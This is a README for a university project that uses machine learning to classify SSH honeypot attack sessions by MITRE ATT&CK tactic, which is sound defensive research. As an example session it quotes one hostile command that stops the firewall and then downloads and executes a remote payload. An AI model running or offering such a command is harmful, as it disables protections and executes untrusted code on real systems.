# ML4N - SSH Shell Attack Analysis

A Machine Learning project for analyzing and classifying Unix shell attack sessions from SSH honeypot deployments using natural language processing and machine learning techniques.

## Project Overview

Security logs are crucial for understanding cyberattacks and diagnosing vulnerabilities. However, analyzing text-based logs remains challenging due to their unclear and malformed nature. This project demonstrates how to automatically support the analysis of Unix shell attack logs through machine learning.

The dataset contains approximately **230,000 unique Unix shell attacks** recorded from SSH honeypot deployments. Each attack session consists of malicious commands executed after SSH login, and the goal is to automatically identify and assign attacker tactics to each session.

**Dataset Source:** [Zenodo Repository](https://zenodo.org/records/3687527)

**Framework:** MITRE ATT&CK Tactics - capturing the "whys" of an attack

## Attack Intent Classification

This project uses the **MITRE ATT&CK Tactics** framework to classify attack sessions into seven intent categories:

### Intent Classes

- **Persistence** - The adversary maintains their foothold through techniques that keep access across restarts, credential changes, and interruptions. Includes replacing legitimate code, hijacking processes, or adding startup code.

- **Discovery** - The adversary gathers knowledge about the system and internal network to understand what they can control and how to benefit their objectives. Often uses native OS tools for reconnaissance.

- **Defense Evasion** - The adversary avoids detection by uninstalling/disabling security software, obfuscating/encrypting data and scripts, or hiding malware within trusted processes.

- **Execution** - The adversary runs malicious code on local or remote systems. These techniques are often paired with other tactics to achieve broader goals like network exploration or data theft.

- **Impact** - The adversary manipulates, interrupts, or destroys systems and data by disrupting availability or compromising integrity of business processes. Includes data destruction, tampering, or alteration.

- **Other** - Contains less common tactics including Reconnaissance, Resource Development, Initial Access, Privilege Escalation, Credential Access, Lateral Movement, Command and Control, and Exfiltration.

- **Harmless** - Non-malicious code by itself.

### Example Attack Session
```bash
iptables stop; wget http://1.1.1.1/exec; chmod 777 exec; ./exec
```
In this session, the attacker first **Impacts** the system by stopping its firewall, then downloads and **Executes** malicious code.

## Dataset Description

The dataset is stored in Parquet format and contains **230,000 attack sessions** with the following structure:

| Column | Description |
|--------|-------------|
| `session_id` | Integer identifier for each session |
| `full_session` | Complete attack session text (sequence of commands and parameters) |
| `first_timestamp` | Attack start time (e.g., `2019-06-04 09:45:50.396610+00:00`) |
| `Set_Fingerprint` | Set of intents associated with the session (subset of the 7 intent classes) |

**Important Notes:**
- **Multi-label problem:** Each session can have multiple intents
- Labels are automatically generated (not human-annotated) and may contain errors
- For this project, labels are treated as ground truth
- Misclassified sessions should be documented in the final report

### Key Dataset Characteristics (from Analysis)
- **Temporal Pattern:** Continuous attack activity with automated tool signatures
- **Session Length:** Heavy-tailed distribution (mean >> median)
- **Vocabulary:** Shell command-dominated (cd, chmod, wget, etc.)
- **Most Common Intents:** Execution & Discovery
- **Sparsity:** ~99% sparse BoW/TF-IDF matrices
- **Average Intents per Session:** 1-2 intents

## Project Structure

```
├── 01_data_exploration.ipynb      # Section 1: Data exploration & preprocessing
├── 02_classification.ipynb         # Section 2: Supervised classification
├── 03_clustering.ipynb             # Section 3: Unsupervised clustering (planned)
├── 04_language_models.ipynb        # Section 4: BERT/Doc2Vec models (planned)
├── ssh_attacks.parquet             # Dataset file
└── README.md                       # This file
```

## Project Sections

### Section 1: Data Exploration & Pre-processing

**Objectives:**
1. Analyze temporal patterns of attacks (hourly, daily, monthly trends)
2. Extract session-level features (character counts, word counts, distributions)
3. Identify most common words in attack vocabulary
4. Analyze intent distribution and temporal patterns
5. Convert text to numerical representations using Bag of Words (BoW)
6. Compute TF-IDF values for each word in each session


### Section 2: Supervised Learning - Classification

**Objectives:**
1. Split dataset into training and test sets with appropriate preprocessing
2. Train at least 2 ML classification models with default parameters
3. Evaluate performance using confusion matrices and classification reports
4. Tune hyperparameters through cross-validation
5. Analyze performance for each intent class
6. Experiment with feature combinations (BoW vs TF-IDF)

**Challenges:**
- Multi-label classification problem
- Class imbalance (Execution/Discovery vs Impact)
- Preventing data leakage (fit TF-IDF on training data only)
- Handling sparse feature matrices

### Section 3: Unsupervised Learning - Clustering

**Objectives:**
1. Cluster attack sessions based on text similarity
2. Implement at least 2 clustering algorithms
3. Determine optimal number of clusters with justification
4. Tune hyperparameters for each algorithm
5. Visualize clusters using dimensionality reduction
6. Analyze cluster characteristics (word clouds, intent homogeneity)
7. Identify fine-grained attack categories beyond MITRE tactics

**Analysis Goals:**
- Are clusters homogeneous in terms of intents?
- Can clusters reveal new attack patterns?
- How do clustering results compare to supervised labels?

### Section 4: Language Models Exploration

**Objectives:**
1. Implement either **Doc2Vec** or **BERT** for intent classification
2. Leverage transfer learning and pre-trained models
3. Add classification layer and fine-tune on labeled data
4. Plot learning curves for training and validation sets
5. Determine optimal number of training epochs

**Approaches:**
- **Doc2Vec:** Pretrain on entire corpus (unsupervised), add dense layer, fine-tune
- **BERT:** Use pretrained model from HuggingFace, add classification layer, fine-tune

**Key Concepts:**
- Transfer learning from large-scale pre-trained models
- Unsupervised text encoding allows using full dataset
- Fine-tuning adapts general language understanding to security domain

## Technical Stack

**Core Libraries:**
```python
# Data manipulation
pandas
numpy
pyarrow  # For Parquet format

# Visualization
matplotlib
seaborn

# Machine Learning
scikit-learn
  - CountVectorizer (Bag of Words)
  - TfidfVectorizer (TF-IDF)
  - Classification models
  - Clustering algorithms

# Deep Learning (Section 4)
transformers  # For BERT
gensim        # For Doc2Vec
```

**NLP Preprocessing:**
- Token pattern: `[A-Za-z0-9_./:-]+` (captures shell commands, paths, flags)
- Min document frequency: 5 (filters noise)
- Max features: 5000 (balances expressiveness and computational cost)
- Lowercase normalization

## Installation & Usage

### Prerequisites
```bash
pip install pandas numpy pyarrow matplotlib seaborn scikit-learn
```

## Academic Context

- **Course:** Machine Learning for Networking (ML4N)
- **Institution:** Politecnico di Torino (PoliTO)
- **Group Members:** Donya Mohebi, Michele Valerio, Shahrokh Af, Thiago Ricardo
- **Framework:** MITRE ATT&CK Tactics

## References

- **MITRE ATT&CK Framework:** https://attack.mitre.org/
- **Dataset:** https://zenodo.org/records/3687527
